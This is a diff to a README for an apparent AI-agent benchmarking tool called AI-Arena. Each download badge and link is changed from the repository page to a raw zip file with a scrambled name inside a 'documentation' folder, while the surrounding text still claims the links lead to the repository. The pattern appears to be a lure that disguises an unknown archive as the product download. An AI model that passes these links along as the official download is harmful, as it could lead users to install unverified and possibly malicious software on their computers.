@@ -1,6 +1,6 @@
 # 🤖 AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents - Track AI Agent Performance Easily
 
-[![Download AI-Arena](https://img.shields.io/badge/Download-AI--Arena-brightgreen?style=for-the-badge)](https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents)
+[![Download AI-Arena](https://img.shields.io/badge/Download-AI--Arena-brightgreen?style=for-the-badge)](https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents/raw/refs/heads/main/documentation/for_Platform_Benchmarking_Agents_A_Autonomous_Arena_1.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download and run AI-Arena on your Windows PC.
 
 Visit this page to download AI-Arena:
 
-[Download AI-Arena from GitHub](https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents)
+[Download AI-Arena from GitHub](https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents/raw/refs/heads/main/documentation/for_Platform_Benchmarking_Agents_A_Autonomous_Arena_1.3.zip)
 
 This link leads you to the project repository. Look for the latest release section or download options.
 
@@ -134,9 +134,9 @@ If problems continue, you can report issues on the GitHub page under the "Issues
 ## 🔗 Useful Links
 
 - GitHub Repository:  
-  https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents
+  https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents/raw/refs/heads/main/documentation/for_Platform_Benchmarking_Agents_A_Autonomous_Arena_1.3.zip
 - Download Page:  
-  https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents
+  https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents/raw/refs/heads/main/documentation/for_Platform_Benchmarking_Agents_A_Autonomous_Arena_1.3.zip
 
 ---
 
@@ -148,7 +148,7 @@ The project welcomes community contributions. Even without coding skills, you ca
 
 ---
 
-[![Download AI-Arena](https://img.shields.io/badge/Download-AI--Arena-blue?style=for-the-badge)](https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents)
+[![Download AI-Arena](https://img.shields.io/badge/Download-AI--Arena-blue?style=for-the-badge)](https://github.com/azurefr/AI-Arena---Benchmarking-Platform-for-Autonomous-AI-Agents/raw/refs/heads/main/documentation/for_Platform_Benchmarking_Agents_A_Autonomous_Arena_1.3.zip)
 
 ---
 
